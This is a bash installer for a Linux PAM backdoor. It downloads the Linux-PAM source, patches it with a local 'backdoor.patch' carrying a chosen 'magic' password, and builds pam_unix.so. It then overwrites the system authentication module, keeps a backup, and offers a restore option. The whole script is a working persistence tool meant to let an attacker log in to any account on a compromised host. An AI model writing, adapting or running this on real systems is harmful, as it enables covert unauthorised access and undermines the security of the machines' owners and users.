#!/bin/bash

OPTIND=1
PAM_VERSION=""
PAM_FILE=""
PASSWORD=""
PAM_DEST_DIR="/lib/x86_64-linux-gnu/security"
BACKUP_FILE="${PAM_DEST_DIR}/pam_unix.so.bak"
TARGET_FILE="${PAM_DEST_DIR}/pam_unix.so"

DEPENDENCIES=(
    autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl 
    flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev 
    libselinux1-dev libtool libcrypt-dev libxml2-utils make 
    pkg-config sed w3m xsltproc xz-utils gcc wget
)

function show_help {
    echo "Usage: $0 [-v version] -p password [--restore]"
    echo ""
    echo "Options:"
    echo "  -v          Specify Linux-PAM version (e.g., 1.3.1)."
    echo "  -p          The 'magic' password for the backdoor."
    echo "  --restore   Restore the original pam_unix.so from backup."
    echo "  -h, --help  Show this help message."
}

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root (use sudo)."
   exit 1
fi

if [[ "$1" == "--restore" ]]; then
    if [ -f "$BACKUP_FILE" ]; then
        echo "Restoring backup from $BACKUP_FILE..."
        cp "$BACKUP_FILE" "$TARGET_FILE"
        echo "Restore complete. Please verify login in a separate terminal."
        exit 0
    else
        echo "Error: No backup found at $BACKUP_FILE"
        exit 1
    fi
fi

function check_dependencies {
    echo "Checking dependencies..."
    MISSING_PKGS=()
    for pkg in "${DEPENDENCIES[@]}"; do
        if ! dpkg -s "$pkg" >/dev/null 2>&1; then
            MISSING_PKGS+=("$pkg")
        fi
    done

    if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
        echo "Installing missing dependencies: ${MISSING_PKGS[*]}"
        apt update && apt install -y "${MISSING_PKGS[@]}"
    else
        echo "All dependencies are already installed."
    fi
}

for arg in "$@"; do
    if [[ "$arg" == "--help" || "$arg" == "-h" ]]; then
        show_help
        exit 0
    fi
done

while getopts ":p:v:" opt; do
    case "$opt" in
    v) PAM_VERSION="$OPTARG" ;;
    p) PASSWORD="$OPTARG" ;;
    *) show_help; exit 1 ;;
    esac
done

shift $((OPTIND-1))

if [ -z "$PASSWORD" ]; then
    echo "Error: Password (-p) is required unless using --restore."
    show_help
    exit 1
fi

check_dependencies

if [ -z "$PAM_VERSION" ]; then
    PAM_VERSION=$(dpkg -s libpam-modules | grep '^Version' | cut -d' ' -f2 | cut -d'-' -f1)
    echo "Detected Version: $PAM_VERSION"
fi

PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
PAM_DIR="linux-pam-${PAM_VERSION}"
PAM_FILE="v${PAM_VERSION}.tar.gz"

# (Download logic remains same)
wget -c "${PAM_BASE_URL}/${PAM_FILE}" || {
    PAM_DIR="linux-pam-Linux-PAM-${PAM_VERSION}"
    PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.gz"
    wget -c "${PAM_BASE_URL}/${PAM_FILE}"
}

tar xzf "$PAM_FILE"

if [ -f "backdoor.patch" ]; then
    sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR"
else
    echo "Error: backdoor.patch not found."
    exit 1
fi

cd "$PAM_DIR"
[[ ! -f "./configure" ]] && ./autogen.sh
./configure --libdir=/lib/x86_64-linux-gnu
make

if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
    if [ ! -f "$BACKUP_FILE" ]; then
        echo "Creating initial backup of original PAM module..."
        cp "$TARGET_FILE" "$BACKUP_FILE"
    fi

    echo "Deploying modified module..."
    cp modules/pam_unix/.libs/pam_unix.so "$TARGET_FILE"
    echo "Success: Backdoor deployed to $TARGET_FILE"
    echo "Original backup kept at: $BACKUP_FILE"
else
    echo "Error: Build failed."
    exit 1
fi
